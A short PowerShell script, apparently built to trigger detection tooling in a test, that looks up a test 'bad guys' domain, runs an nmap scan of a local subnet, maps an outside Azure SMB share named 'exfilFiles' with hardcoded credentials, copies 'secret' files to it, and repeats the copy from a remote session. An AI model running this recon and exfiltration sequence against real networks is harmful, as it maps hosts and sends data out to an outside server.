$domain = "www.internetbadguys.com"
$nslookupResult = nslookup $domain

# Output the results of nslookup
Write-Output "NSLookup results for ${domain}:"
Write-Output $nslookupResult

# Install Powershell NMap module
Install-Module -Name PSnmap -Scope CurrentUser -Force
# Run NMap scan on local subnet
Invoke-PSnmap -Cn 10.10.10.0/24 -ScanOnPingFail -Port 443, 3389, 22 -Dns -PortConnectTimeoutMs 1000 -AddService

# Create new file share link
New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -TransportType QUIC -SkipCertificateCheck -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
# Copy temp file to remote share
copy 'C:\Temp\super-secret-db.db' 'Z:\'

# Connect to remote device
Enter-PSSession 10.10.10.91
# Create new file share link
New-SmbMapping -RemotePath '\\xdr-datastorehost.westeurope.cloudapp.azure.com\exfilFiles' -TransportType QUIC -SkipCertificateCheck -UserName 'exfil' -Password 'C1sco12345' -LocalPath 'Z:'
# Copy temp file to remote share
copy 'C:\Temp\secret-data.txt' 'Z:\'
# Exit remote device
Exit-PSSession

# Prevent the PowerShell window from closing immediately - for visibility in testing
Read-Host -Prompt "Press Enter to exit"
